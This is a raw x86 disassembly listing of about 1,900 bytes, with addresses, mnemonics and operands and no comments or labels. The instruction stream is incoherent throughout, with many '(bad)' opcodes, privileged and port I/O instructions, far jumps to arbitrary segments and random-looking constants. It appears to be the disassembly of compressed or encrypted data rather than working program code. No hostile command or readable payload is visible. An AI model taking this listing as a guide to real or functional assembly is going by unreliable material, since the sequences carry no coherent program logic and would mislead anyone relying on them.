  4155bd:	aas    
  4155be:	jns    0x41561a
  4155c0:	sbb    BYTE PTR [eax+0x5c],bh
  4155c3:	push   eax
  4155c4:	add    eax,DWORD PTR [edi]
  4155c6:	pop    esi
  4155c7:	pop    edi
  4155c8:	sub    al,0x75
  4155ca:	into   
  4155cb:	pop    eax
  4155cc:	bnd retw 0x5b8
  4155d1:	retf   0xf7f4
  4155d4:	stos   DWORD PTR es:[edi],eax
  4155d5:	fnsave [ebp+eax*8+0x8]
  4155d9:	push   edi
  4155da:	in     al,dx
  4155db:	jnp    0x415645
  4155dd:	pop    ecx
  4155de:	loop   0x4155b4
  4155e0:	and    al,0xed
  4155e2:	pushf  
  4155e3:	popa   
  4155e4:	fwait
  4155e5:	test   eax,0x431167f1
  4155ea:	fidiv  DWORD PTR [ecx]
  4155ec:	scas   eax,DWORD PTR es:[edi]
  4155ed:	sbb    BYTE PTR [edi-0x75],cl
  4155f0:	cmp    ecx,DWORD PTR [edi+0x52]
  4155f3:	mov    esp,0x7834348e
  4155f8:	sbb    DWORD PTR [edi],edi
  4155fa:	mov    eax,0x2b5c0ef9
  4155ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415600:	sbb    BYTE PTR [ebx-0x13],dh
  415603:	and    al,0x19
  415605:	loope  0x4155a1
  415607:	adc    dh,ah
  415609:	test   al,0xaf
  41560b:	scas   eax,DWORD PTR es:[edi]
  41560c:	repz fnstsw WORD PTR [edi]
  41560f:	jnp    0x4155f6
  415611:	pop    edi
  415612:	addr16 cmc 
  415614:	mov    ecx,0x55829b55
  415619:	ret    0x7708
  41561c:	sbb    eax,0x5156823d
  415621:	xor    DWORD PTR [edi-0x7b468b1d],esi
  415627:	and    DWORD PTR [ebx+0x2a72b021],ebx
  41562d:	pop    edi
  41562e:	cmp    eax,0x6ff87517
  415633:	out    0xa6,eax
  415635:	add    BYTE PTR [ebp-0x337607e5],0x23
  41563c:	cmp    eax,0x3a3e2c2
  415641:	pop    ds
  415642:	push   esi
  415643:	push   ss
  415644:	mov    dh,al
  415646:	sbb    DWORD PTR [esi+esi*8],esp
  415649:	call   0x7709:0xa1f3675
  415650:	in     al,dx
  415651:	push   edi
  415652:	fninit 
  415654:	lahf   
  415655:	(bad)  
  415656:	jno    0x415688
  415658:	outs   dx,BYTE PTR ds:[esi]
  415659:	xchg   ebx,eax
  41565a:	and    BYTE PTR [esi+0xf6ff74],dl
  415660:	mov    ds:0xc3720c4d,eax
  415665:	popa   
  415666:	fs ret 
  415668:	mov    eax,0xde2f12bd
  41566d:	loopne 0x41560d
  41566f:	push   0x7f
  415671:	cli    
  415672:	ret    
  415673:	pop    ebp
  415674:	jb     0x41565c
  415676:	pop    edi
  415677:	push   ebx
  415678:	arpl   WORD PTR [eax+0x6f],cx
  41567b:	cmp    cl,BYTE PTR [edx-0x1]
  41567e:	sub    DWORD PTR [edx-0x11],esp
  415681:	test   al,0x8b
  415683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415684:	dec    esi
  415685:	add    ah,BYTE PTR [esi-0x15374b63]
  41568b:	or     ecx,esi
  41568d:	push   cs
  41568e:	push   eax
  41568f:	leave  
  415690:	test   al,0xb4
  415692:	sbb    dl,BYTE PTR [ebx]
  415694:	scas   al,BYTE PTR es:[edi]
  415695:	add    al,0xf3
  415697:	inc    ebx
  415698:	fst    DWORD PTR [edi]
  41569a:	pop    esp
  41569b:	jae    0x415693
  41569d:	fld    TBYTE PTR [eax+edi*1+0x5b85a1f8]
  4156a4:	shl    BYTE PTR [ebx+eiz*8],1
  4156a7:	pushf  
  4156a8:	mov    ch,0xd5
  4156aa:	inc    ecx
  4156ab:	daa    
  4156ac:	pop    ebp
  4156ad:	jecxz  0x415671
  4156af:	enter  0x1592,0x62
  4156b3:	fistp  QWORD PTR [ecx-0x68d6db60]
  4156b9:	icebp  
  4156ba:	jecxz  0x4156d1
  4156bc:	mov    al,ds:0xba84f25e
  4156c1:	sub    eax,DWORD PTR ds:0xe46167cb
  4156c7:	sahf   
  4156c8:	repz sbb BYTE PTR [ebp+0x6ace32be],dh
  4156cf:	in     eax,dx
  4156d0:	push   edx
  4156d1:	mov    ebx,0x1cbdc89b
  4156d6:	push   ebp
  4156d7:	sub    esp,esp
  4156d9:	mov    al,0xc6
  4156db:	adc    eax,0x9f8fb274
  4156e0:	je     0x41569c
  4156e2:	lods   al,BYTE PTR ds:[esi]
  4156e3:	(bad)  
  4156e4:	repz daa 
  4156e6:	mov    bl,0x46
  4156e8:	xchg   ecx,eax
  4156e9:	mov    ecx,0x1781535d
  4156ee:	sbb    bl,dl
  4156f0:	adc    bh,dl
  4156f2:	push   0xffffffbc
  4156f4:	fwait
  4156f5:	sahf   
  4156f6:	push   ecx
  4156f7:	into   
  4156f8:	xchg   ebx,eax
  4156f9:	int3   
  4156fa:	cli    
  4156fb:	shl    DWORD PTR [eax+eiz*1],0x53
  4156ff:	pop    ss
  415700:	inc    ecx
  415701:	mov    ah,0xa5
  415703:	push   eax
  415704:	daa    
  415705:	add    al,0x14
  415707:	mov    ds:0x8451109e,eax
  41570c:	rcl    al,cl
  41570e:	int3   
  41570f:	pop    esi
  415710:	or     esi,DWORD PTR [edx-0x55]
  415713:	jp     0x41576f
  415715:	inc    ecx
  415716:	cdq    
  415717:	and    bh,BYTE PTR [edi+0x6f]
  41571a:	fcmove st,st(3)
  41571c:	xor    ebp,DWORD PTR [esp+ecx*2+0x31]
  415720:	add    ch,BYTE PTR [edx]
  415722:	mov    esi,0x5cb5f248
  415727:	cs and al,bh
  41572a:	(bad)  
  41572b:	sbb    dh,BYTE PTR [ebx]
  41572d:	push   esp
  41572e:	mov    ?,WORD PTR [ebx]
  415730:	push   ecx
  415731:	sub    BYTE PTR [ebp+0x6f],bh
  415734:	cli    
  415735:	mov    esp,0x31bb247c
  41573a:	push   eax
  41573b:	rep outs dx,BYTE PTR ds:[esi]
  41573d:	xor    eax,0xba124ea4
  415742:	fidiv  WORD PTR [ebx]
  415744:	(bad)  [esi-0x64]
  415747:	test   edi,ebx
  415749:	repnz call 0x5100:0xd485f443
  415751:	xchg   ebx,eax
  415752:	dec    ecx
  415753:	popa   
  415754:	pop    ebp
  415755:	into   
  415756:	pop    eax
  415757:	sti    
  415758:	stc    
  415759:	jbe    0x415774
  41575b:	sbb    al,0xc4
  41575d:	dec    esp
  41575e:	fbld   TBYTE PTR [ebx+0x39]
  415761:	sahf   
  415762:	mov    al,ds:0x2682a03a
  415767:	ret    
  415768:	mov    ebx,0x41047574
  41576d:	cmp    BYTE PTR [ebp-0x5],cl
  415770:	and    esp,DWORD PTR [eax+0x1c3d5f11]
  415776:	push   esp
  415777:	add    eax,0xe399455c
  41577c:	popa   
  41577d:	sbb    al,0xb5
  41577f:	xlat   BYTE PTR ds:[ebx]
  415780:	iret   
  415781:	loope  0x41579d
  415783:	call   0xfc3b:0x85db6a6f
  41578a:	mov    dh,0x58
  41578c:	push   0xfffffff2
  41578e:	lea    esi,[ebx-0x5f]
  415791:	addr16 aad 0x9f
  415794:	lds    esp,FWORD PTR ds:0x22184475
  41579a:	mov    esi,0x110a4f2
  41579f:	mov    ah,0xe
  4157a1:	jne    0x415810
  4157a3:	pop    esp
  4157a4:	fdivrp st(3),st
  4157a6:	jns    0x41573a
  4157a8:	add    al,0x11
  4157aa:	sti    
  4157ab:	dec    edi
  4157ac:	cwde   
  4157ad:	pushf  
  4157ae:	xor    eax,0xf1e1094b
  4157b3:	jp     0x4157e7
  4157b5:	mov    ebp,0x84971e1a
  4157ba:	stos   DWORD PTR es:[edi],eax
  4157bb:	leave  
  4157bc:	sbb    al,0x3c
  4157be:	les    ebp,FWORD PTR ds:0xc82d7a53
  4157c4:	add    ch,bh
  4157c6:	in     eax,0x0
  4157c8:	in     eax,0x64
  4157ca:	mov    ds:0xbbd18122,al
  4157cf:	sar    BYTE PTR [esi+edx*4-0x56874c7c],cl
  4157d6:	cmp    al,0x84
  4157d8:	stos   DWORD PTR es:[edi],eax
  4157d9:	loop   0x41576b
  4157db:	lds    ebx,FWORD PTR [eax-0x76b0e961]
  4157e1:	aad    0x71
  4157e3:	sub    eax,0xe7681c28
  4157e8:	push   ss
  4157e9:	outs   dx,BYTE PTR ds:[esi]
  4157ea:	out    0x14,al
  4157ec:	or     edi,edx
  4157ee:	popa   
  4157ef:	mov    edx,0x419ab7bd
  4157f4:	(bad)  
  4157f5:	ficom  WORD PTR [edx]
  4157f7:	pop    esp
  4157f8:	mov    edx,0xe8dbbad2
  4157fd:	xor    DWORD PTR [esi-0x5085a331],esi
  415803:	mov    eax,0x27c3230e
  415808:	loope  0x415879
  41580a:	(bad)  
  41580c:	(bad)  [esi+0x2d]
  41580f:	add    esi,DWORD PTR [ecx+esi*4-0x6b216a0]
  415816:	fstp   QWORD PTR [edi+0xcc1658b]
  41581c:	mov    esp,0xe05c6c4a
  415821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415822:	pop    es
  415823:	aas    
  415824:	mov    BYTE PTR [edi+0x7f],al
  415827:	out    0x45,al
  415829:	xor    dl,ch
  41582b:	sub    BYTE PTR [edi+0x71ea3b7c],dh
  415831:	outs   dx,DWORD PTR ds:[esi]
  415832:	pusha  
  415833:	int    0xc8
  415835:	xor    dl,BYTE PTR [ebp+0x13e024c2]
  41583b:	cs jns 0x4157c3
  41583e:	pop    ebx
  41583f:	addr16 cmc 
  415841:	push   0x96bb0a39
  415846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415847:	mov    BYTE PTR [esi+0x7362975],bl
  41584d:	out    0xf7,eax
  41584f:	mov    DWORD PTR [eax-0x24e993e7],edi
  415855:	sub    bh,al
  415857:	outs   dx,BYTE PTR ds:[esi]
  415858:	retf   0xd143
  41585b:	test   cl,bl
  41585d:	scas   al,BYTE PTR es:[edi]
  41585e:	inc    ebx
  41585f:	push   edx
  415860:	sbb    al,0x35
  415862:	xor    BYTE PTR [edx+0x11],ah
  415865:	sbb    esi,DWORD PTR [esi-0x4978b4ee]
  41586b:	inc    esp
  41586c:	pushf  
  41586d:	pushf  
  41586e:	and    dh,bl
  415870:	sub    eax,0x5aa396dd
  415875:	aam    0x5d
  415877:	cmp    al,bh
  415879:	mov    ?,edx
  41587b:	popa   
  41587c:	out    0xdd,al
  41587e:	xor    al,0x42
  415880:	inc    bh
  415882:	(bad)  
  415883:	ds inc edx
  415885:	fadd   st(1),st
  415887:	add    ebx,edi
  415889:	mov    WORD PTR [edi+ebp*1-0x48],ss
  41588d:	push   esi
  41588e:	pop    esp
  41588f:	sub    DWORD PTR [ebp-0x2c],edi
  415892:	pop    esi
  415893:	mov    al,0xbe
  415895:	fcmovb st,st(0)
  415897:	aas    
  415898:	jg     0x4158e2
  41589a:	and    DWORD PTR [edx+edi*1+0x677c8c96],ebx
  4158a1:	and    eax,0x3020b666
  4158a6:	cmp    BYTE PTR [ebx-0x77],0x2c
  4158aa:	xchg   edx,eax
  4158ab:	add    al,0x4d
  4158ad:	cld    
  4158ae:	arpl   ax,dx
  4158b0:	ja     0x41587a
  4158b2:	dec    esi
  4158b3:	lock mov bh,BYTE PTR [esp+ebp*1]
  4158b7:	sar    BYTE PTR [edi],0x27
  4158ba:	jp     0x415912
  4158bc:	mov    bh,0xd1
  4158be:	mov    al,0xcd
  4158c0:	ss xchg ecx,eax
  4158c2:	mov    cl,0x2d
  4158c4:	in     al,dx
  4158c5:	pop    ebx
  4158c6:	mov    esp,0x758adbb3
  4158cb:	jle    0x415940
  4158cd:	xchg   ebx,eax
  4158ce:	mov    ds:0x45377dba,eax
  4158d3:	inc    ebp
  4158d4:	in     al,dx
  4158d5:	aaa    
  4158d6:	sbb    DWORD PTR [eax+0x5e],ecx
  4158d9:	aam    0xb1
  4158db:	hlt    
  4158dc:	or     DWORD PTR [eax+edx*1],esi
  4158df:	lds    eax,FWORD PTR [eax+0x42]
  4158e2:	xor    BYTE PTR [edi],0x85
  4158e5:	test   eax,0x3fc4c386
  4158ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158eb:	mov    ecx,0xd2eeb42
  4158f0:	xchg   ecx,eax
  4158f1:	xchg   DWORD PTR [edi+0xc],edi
  4158f4:	pop    esi
  4158f5:	xlat   BYTE PTR ds:[ebx]
  4158f6:	pop    ecx
  4158f7:	imul   ebx,DWORD PTR [ecx-0x69],0x6f4f6259
  4158fe:	sub    bh,BYTE PTR [edi]
  415900:	sub    ebx,eax
  415902:	and    BYTE PTR [ebp+0xf],dh
  415905:	inc    esp
  415906:	popa   
  415907:	ret    0xddc0
  41590a:	xor    eax,0x3ab58480
  41590f:	pusha  
  415910:	add    al,0xfa
  415912:	pop    es
  415913:	adc    DWORD PTR [ecx+0x2c],esp
  415916:	into   
  415917:	test   BYTE PTR [edx],ch
  415919:	les    edi,FWORD PTR [edi]
  41591b:	pop    ebx
  41591c:	addr16 inc esi
  41591e:	shl    BYTE PTR [edx],0x12
  415921:	out    0x3e,al
  415923:	sahf   
  415924:	push   edi
  415925:	mov    DWORD PTR [edi-0x3ccdef10],0x6af459f7
  41592f:	mov    WORD PTR [ebx+0x3978d13f],?
  415935:	out    0x98,eax
  415937:	mov    edx,0x351ab9d7
  41593c:	xchg   edi,eax
  41593d:	push   esp
  41593e:	xchg   edi,eax
  41593f:	sbb    DWORD PTR [ecx+edi*4-0x34da8bcb],0x594616f6
  41594a:	aas    
  41594b:	int    0x9d
  41594d:	cmp    BYTE PTR [ebx+0x4c1f99cc],0x3f
  415954:	retf   
  415955:	add    al,0xc3
  415957:	and    ebx,DWORD PTR [ebp+0x25d1a5d8]
  41595d:	add    DWORD PTR [ebx+0x17],esp
  415960:	xchg   esi,eax
  415961:	push   ecx
  415962:	repz cli 
  415964:	add    DWORD PTR [eax-0x34],ecx
  415967:	push   ebp
  415968:	or     eax,0xa5b712e9
  41596d:	mov    dl,0x6b
  41596f:	mov    esi,edx
  415971:	xchg   edx,eax
  415972:	aam    0xd4
  415974:	xchg   ecx,eax
  415975:	int    0x8c
  415977:	dec    ecx
  415978:	xchg   esi,eax
  415979:	test   al,0x9f
  41597b:	test   BYTE PTR [ecx-0x45328fb0],bl
  415981:	mov    esp,0x96cba4c0
  415986:	bound  edx,QWORD PTR [esi+0x15]
  415989:	into   
  41598a:	jg     0x415963
  41598c:	dec    eax
  41598d:	jmp    0x4020:0x1b6f71f0
  415994:	sub    BYTE PTR [edx-0x508c64d9],ah
  41599a:	ja     0x415991
  41599c:	fs aaa 
  41599e:	mov    al,0x63
  4159a0:	test   BYTE PTR [si],dh
  4159a3:	lods   al,BYTE PTR ds:[esi]
  4159a4:	mov    bl,0x7
  4159a6:	mov    cl,0xd
  4159a8:	rol    DWORD PTR [edx],1
  4159aa:	ins    DWORD PTR es:[edi],dx
  4159ab:	or     bl,cl
  4159ad:	jmp    0xd3f9:0xb5bff1f6
  4159b4:	mov    ch,0x9d
  4159b6:	mov    al,0xfc
  4159b8:	mov    ecx,0xb83d68e4
  4159bd:	call   0x406fd07d
  4159c2:	call   0x52d8:0xfbe828c7
  4159c9:	dec    DWORD PTR [ebp+esi*4+0x47e72429]
  4159d0:	dec    esp
  4159d1:	test   BYTE PTR [ebp-0x5b937653],bl
  4159d7:	xor    BYTE PTR [edi+0x4bad68ac],0x47
  4159de:	mov    ch,0x75
  4159e0:	push   eax
  4159e1:	rcl    DWORD PTR [esi+0x1b868ff2],cl
  4159e7:	xor    dh,ah
  4159e9:	call   0x7fb0:0x653735a7
  4159f0:	mov    BYTE PTR [esi+eax*1-0x61],bh
  4159f4:	(bad)  
  4159f5:	cmc    
  4159f6:	repnz sar DWORD PTR [ebp-0x4d3c7b36],1
  4159fd:	sbb    DWORD PTR [edi+eax*1],esp
  415a00:	push   edx
  415a01:	in     al,dx
  415a02:	and    eax,ebp
  415a04:	mov    eax,ds:0x33f49492
  415a09:	cmp    al,0x8e
  415a0b:	cmp    al,0x9d
  415a0d:	js     0x4159c0
  415a0f:	sbb    edx,ebp
  415a11:	push   ds
  415a12:	in     al,dx
  415a13:	mov    ebx,0xe42cebc7
  415a18:	shl    BYTE PTR [edi+0x3d],cl
  415a1b:	and    DWORD PTR [eax],edi
  415a1d:	mov    eax,ds:0x1e22d6b6
  415a22:	dec    edi
  415a23:	sbb    eax,0x7fe3e8c6
  415a28:	iret   
  415a29:	push   ecx
  415a2a:	sbb    BYTE PTR [esi],ch
  415a2c:	xchg   ebx,eax
  415a2d:	add    DWORD PTR [edx+0x65555778],0xfffffff5
  415a34:	mov    dl,0x42
  415a36:	dec    ebx
  415a37:	or     eax,0x18c4c729
  415a3c:	fcmovb st,st(2)
  415a3e:	jb     0x415a9d
  415a40:	and    ch,BYTE PTR [esp+ebx*8-0x39]
  415a44:	test   eax,0x7638133e
  415a49:	rcl    BYTE PTR [ebp+0x7f],0xb6
  415a4d:	jae    0x415a37
  415a4f:	repz mov bh,0x8f
  415a52:	mov    al,ds:0xaeb1dfda
  415a57:	mov    dh,0xb9
  415a59:	retf   
  415a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a5b:	pop    ecx
  415a5c:	mov    ds:0xc5793a62,al
  415a61:	adc    ecx,DWORD PTR [ecx*1-0x7757388]
  415a68:	in     eax,dx
  415a69:	(bad)  
  415a6a:	es dec ebx
  415a6c:	stc    
  415a6d:	xchg   ecx,eax
  415a6e:	jne    0x415a07
  415a70:	dec    ebp
  415a71:	push   ss
  415a72:	das    
  415a73:	loop   0x415ad4
  415a75:	ds jns 0x415a69
  415a78:	loop   0x415a2d
  415a7a:	push   ebx
  415a7b:	clc    
  415a7c:	xchg   esi,eax
  415a7d:	adc    eax,0xa22e88bf
  415a82:	cmp    DWORD PTR [eax+edx*2+0x50],eax
  415a86:	adc    bl,BYTE PTR [eax-0x80]
  415a89:	dec    esi
  415a8a:	out    dx,eax
  415a8b:	push   edx
  415a8c:	jbe    0x415ac4
  415a8e:	jg     0x415a70
  415a90:	out    dx,al
  415a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a92:	lods   eax,DWORD PTR ds:[esi]
  415a93:	cmp    al,0x3d
  415a95:	stos   DWORD PTR es:[edi],eax
  415a96:	icebp  
  415a97:	inc    ebp
  415a98:	jnp    0x415a9e
  415a9a:	mov    dh,BYTE PTR ds:0x26b7942e
  415aa0:	sbb    ah,BYTE PTR [edx-0x66]
  415aa3:	scas   ax,WORD PTR es:[edi]
  415aa5:	mov    DWORD PTR ds:0xe646ac21,edi
  415aab:	(bad)  
  415aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aad:	jb     0x415aec
  415aaf:	push   ecx
  415ab0:	dec    ecx
  415ab1:	xor    bl,BYTE PTR [ecx]
  415ab3:	retf   0x93a
  415ab6:	nop
  415ab7:	imul   dl
  415ab9:	js     0x415a8f
  415abb:	loope  0x415b0f
  415abd:	call   0x702c:0xef2a0a
  415ac4:	(bad)  
  415ac5:	repnz sbb ch,ah
  415ac8:	mov    WORD PTR [edx-0x7728a587],es
  415ace:	dec    edi
  415acf:	call   0xb7a42d14
  415ad4:	jp     0x415ad5
  415ad6:	mov    ch,0xe1
  415ad8:	mov    dl,0x3c
  415ada:	pop    ss
  415adb:	(bad)  
  415adc:	sbb    bh,BYTE PTR [edi+edx*8]
  415adf:	aad    0x34
  415ae1:	mov    WORD PTR [eax],ds
  415ae3:	push   esi
  415ae4:	and    eax,0x707eee3a
  415ae9:	and    dh,bh
  415aeb:	(bad)  
  415aec:	in     al,dx
  415aed:	int    0x74
  415aef:	mov    ch,0xd4
  415af1:	ret    
  415af2:	mov    al,ds:0xf98ead5a
  415af7:	xor    eax,0x3ad91255
  415afc:	mov    edi,0x14f1ec86
  415b01:	push   ebx
  415b02:	scas   eax,DWORD PTR es:[edi]
  415b03:	sahf   
  415b04:	aaa    
  415b05:	dec    DWORD PTR [esi-0x7cc71ce1]
  415b0b:	or     DWORD PTR [ebx],edx
  415b0d:	or     bh,dl
  415b0f:	ss ins BYTE PTR es:[edi],dx
  415b11:	fisub  DWORD PTR [ecx-0x11766e56]
  415b17:	dec    edi
  415b18:	or     ch,BYTE PTR [ecx]
  415b1a:	mov    edi,0x7be5e1ef
  415b1f:	scas   al,BYTE PTR es:[edi]
  415b20:	mov    cl,0xb4
  415b22:	lods   al,BYTE PTR ds:[esi]
  415b23:	out    dx,eax
  415b24:	fisttp WORD PTR [ebp+0x36f8699]
  415b2a:	mov    dh,0x83
  415b2c:	or     BYTE PTR [edi],dh
  415b2e:	pop    ds
  415b2f:	push   ds
  415b30:	ret    0xff8e
  415b33:	inc    edx
  415b34:	sub    bh,cl
  415b36:	imul   BYTE PTR [ecx-0x6c561642]
  415b3c:	cmc    
  415b3d:	cmp    ecx,DWORD PTR [esi]
  415b3f:	jno    0x415b30
  415b41:	rcl    BYTE PTR [eax-0x37740049],1
  415b47:	and    al,0x47
  415b49:	inc    ebp
  415b4a:	sbb    ecx,ebp
  415b4c:	xor    DWORD PTR [ebp+0x23fd6f6f],ebx
  415b52:	out    0x4,al
  415b54:	xchg   esp,eax
  415b55:	inc    BYTE PTR [eax+0x3d]
  415b58:	jns    0x415b6d
  415b5a:	lock cdq 
  415b5c:	call   0xfeec00a1
  415b61:	scas   eax,DWORD PTR es:[edi]
  415b62:	ds or  ebp,esp
  415b65:	pop    eax
  415b66:	into   
  415b67:	push   cx
  415b69:	ror    DWORD PTR [ebx+edi*1+0x797760a],cl
  415b70:	xor    DWORD PTR [edx-0x1f6bb29f],ecx
  415b76:	aas    
  415b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b78:	jnp    0x415bc4
  415b7a:	les    ebp,FWORD PTR [ebx+edx*8+0x6a]
  415b7e:	push   ebp
  415b7f:	and    ecx,edx
  415b81:	bound  ebx,QWORD PTR [edx]
  415b83:	dec    esi
  415b84:	clc    
  415b85:	cs leave 
  415b87:	psraw  mm7,QWORD PTR [edx-0x21]
  415b8b:	ins    DWORD PTR es:[edi],dx
  415b8c:	jl     0x415b24
  415b8e:	inc    esi
  415b8f:	inc    esp
  415b90:	lods   al,BYTE PTR ds:[esi]
  415b91:	and    eax,0x582b3065
  415b96:	cmovno esi,DWORD PTR [eax-0x41]
  415b9a:	jmp    0x415b8a
  415b9c:	dec    edx
  415b9d:	sbb    DWORD PTR [edi],edx
  415b9f:	pusha  
  415ba0:	fisubr WORD PTR [edi]
  415ba2:	fmul   QWORD PTR [esi]
  415ba5:	fldcw  WORD PTR [esp+edx*2-0x3004c6e]
  415bac:	fsubr  DWORD PTR [ecx+0x5f0d44e5]
  415bb2:	fstp   TBYTE PTR [eax-0x6]
  415bb5:	stc    
  415bb6:	cld    
  415bb7:	mov    ebp,0xce191914
  415bbc:	mov    ch,0xed
  415bbe:	add    eax,eax
  415bc0:	inc    edx
  415bc1:	add    DWORD PTR [ebp+0x2e1d9e1d],ebx
  415bc7:	test   DWORD PTR [edi+0x42],esi
  415bca:	aam    0x41
  415bcc:	sbb    al,0xde
  415bce:	mov    al,0x96
  415bd0:	fidiv  DWORD PTR [ebp+0x32]
  415bd3:	jecxz  0x415bfb
  415bd5:	xlat   BYTE PTR ds:[ebx]
  415bd6:	add    BYTE PTR [edi-0x14],0x94
  415bda:	inc    ecx
  415bdb:	cmp    BYTE PTR ss:[ebx+0x4a],ah
  415bdf:	inc    esp
  415be0:	inc    eax
  415be1:	and    BYTE PTR [esi+0x4a],ah
  415be4:	pop    esp
  415be5:	dec    esi
  415be6:	shl    ecx,cl
  415be8:	add    edi,DWORD PTR [ecx-0xe94a3f2]
  415bee:	adc    al,0xc7
  415bf0:	jmp    0x49605ad7
  415bf5:	dec    ebx
  415bf6:	addr16 push ebp
  415bf8:	addr16 inc edi
  415bfa:	push   ebp
  415bfb:	or     eax,0x14446e0
  415c00:	in     al,0xf3
  415c02:	xchg   esi,eax
  415c03:	pop    ss
  415c04:	mov    al,ds:0x9189adbd
  415c09:	xchg   DWORD PTR [esi-0x19c6d64a],edi
  415c0f:	sahf   
  415c10:	add    DWORD PTR [ebp-0x33],ecx
  415c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c14:	into   
  415c15:	jg     0x415c4d
  415c17:	xchg   ebx,eax
  415c18:	rcr    DWORD PTR [ebx+ebp*1-0x4b],cl
  415c1c:	push   cs
  415c1d:	adc    eax,0x76d24219
  415c22:	cli    
  415c23:	(bad)
  415c27:	sbb    al,0xbf
  415c29:	mov    al,ds:0x44b6141b
  415c2e:	fild   QWORD PTR [ecx+ebx*2+0x26]
  415c32:	xchg   BYTE PTR [edi-0x76],al
  415c35:	into   
  415c36:	push   edx
  415c37:	cmp    ebx,ebx
  415c39:	cmp    cl,BYTE PTR [edi+esi*2]
  415c3c:	lahf   
  415c3d:	jmp    0x4ec38b61
  415c42:	cmp    DWORD PTR [ebp-0x4ea3a676],eax
  415c48:	loopne 0x415cbc
  415c4a:	call   0x9000a0c4
  415c4f:	jb     0x6040938
  415c55:	xchg   ebp,eax
  415c56:	es aas 
  415c58:	cdq    
  415c59:	cli    
  415c5a:	fmul   DWORD PTR [ecx]
  415c5c:	aad    0x9c
  415c5e:	mov    ah,0xb8
  415c60:	adc    ebp,DWORD PTR [ebp-0x41a0f558]
  415c66:	mov    dl,0xdb
  415c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c6a:	pop    ecx
  415c6b:	aam    0x1c
  415c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c6f:	sbb    eax,0xc7de25d
  415c74:	inc    eax
  415c75:	cmp    edx,DWORD PTR [ebp+0x59c5987e]
  415c7b:	(bad)  
  415c7c:	push   edx
  415c7d:	cli    
  415c7e:	lods   al,BYTE PTR ds:[esi]
  415c7f:	adc    BYTE PTR [edx+0x3f4b5ac2],bh
  415c85:	(bad)  
  415c86:	aam    0x20
  415c88:	xlat   BYTE PTR ds:[ebx]
  415c89:	shl    BYTE PTR [ebp+0x7475b028],1
  415c8f:	mov    al,ds:0xb9ed49c6
  415c94:	dec    esi
  415c95:	pop    eax
  415c96:	pop    edi
  415c97:	jmp    0x415cbd
  415c99:	inc    eax
  415c9a:	mov    ebx,0x6f3f3892
  415c9f:	mov    ebp,0x2f5c06d6
  415ca4:	sbb    ch,BYTE PTR [edx+0x1f1fe5e0]
  415caa:	mov    eax,0x15fe03e4
  415caf:	inc    ebp
  415cb1:	nop
  415cb2:	xor    al,0x5f
  415cb4:	inc    edx
  415cb5:	dec    ebp
  415cb6:	sar    BYTE PTR [eax],cl
  415cb8:	pop    esp
  415cb9:	sbb    ecx,DWORD PTR [ecx]
  415cbb:	gs jmp 0x755b338e
  415cc1:	into   
  415cc2:	(bad)  
  415cc3:	div    ebx
  415cc5:	push   ss
  415cc6:	jo     0x415cef
  415cc8:	call   0x9fc2:0x3efbaef0
  415ccf:	inc    eax
  415cd0:	mov    eax,ds:0xffbd16c4
  415cd5:	jge    0x415c91
  415cd7:	xchg   sp,ax
  415cd9:	sub    al,0xcc
  415cdb:	out    0xce,al
  415cdd:	test   DWORD PTR [ebp-0x5],0xd388bd46
  415ce4:	mov    ecx,0x55a4b4cd
  415ce9:	or     al,BYTE PTR [ebx]
  415ceb:	sub    eax,0x4f5dee78
  415cf0:	ret    0x1f1b
  415cf3:	pop    ecx
  415cf4:	(bad)  
  415cf5:	cld    
  415cf6:	adc    dh,BYTE PTR [eax-0x76]
  415cf9:	jo     0x415ca7
  415cfb:	mov    fs,ecx
  415cfd:	call   0x4cd4172a
  415d02:	lds    ebp,FWORD PTR [esi-0x38]
  415d05:	aam    0x9b
  415d07:	mov    ebx,0xbfaafd5c
  415d0c:	(bad)  
  415d0d:	and    eax,0xa640086a
  415d12:	cmp    ebp,DWORD PTR [edx-0x2d1ec03f]
  415d18:	cld    
  415d19:	mov    eax,0x9734976f
  415d1e:	imul   esp,DWORD PTR [ebx-0x365fee55],0xffffff9a
  415d25:	int3   
  415d26:	(bad)  
  415d27:	std    
  415d28:	mov    eax,ds:0x5f0cca22
  415d2d:	mov    ebp,edx
  415d2f:	inc    eax
  415d30:	push   DWORD PTR [ecx-0x33]
  415d33:	xchg   DWORD PTR [eax],esi
  415d35:	retf   0x362a
  415d38:	xlat   BYTE PTR ds:[ebx]
  415d39:	(bad)  
  415d3a:	xchg   esi,eax
  415d3b:	mov    BYTE PTR [esi-0x1c461979],al
  415d41:	cmp    DWORD PTR [edi],ecx
  415d43:	jmp    0x2fef5c6c
  415d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d49:	mov    ah,0x22
  415d4b:	cmp    ebp,DWORD PTR [eax+0x2f]
  415d4e:	popa   
  415d4f:	cmp    DWORD PTR [ecx+ebp*2+0x73],ecx
  415d53:	in     al,0xf1
  415d55:	jmp    0x415dce
  415d57:	mov    edi,0xb385e7f4
  415d5c:	ret    0x9c97
  415d5f:	cmp    edx,DWORD PTR [ebx+0x73]
  415d62:	mov    ecx,0x563a2300
  415d67:	pop    edx
  415d68:	stos   BYTE PTR es:[edi],al
  415d69:	jno    0x415dc4
  415d6b:	out    dx,eax
  415d6c:	and    BYTE PTR [esi+eiz*1],cl
  415d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d70:	rcr    BYTE PTR [ebx],1
  415d72:	lahf   
  415d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d75:	pop    esi
  415d76:	inc    ebx
  415d77:	aam    0xfe
  415d79:	cdq    
  415d7a:	inc    edx
  415d7b:	jmp    0xfd67b3d2
  415d80:	gs push ebp
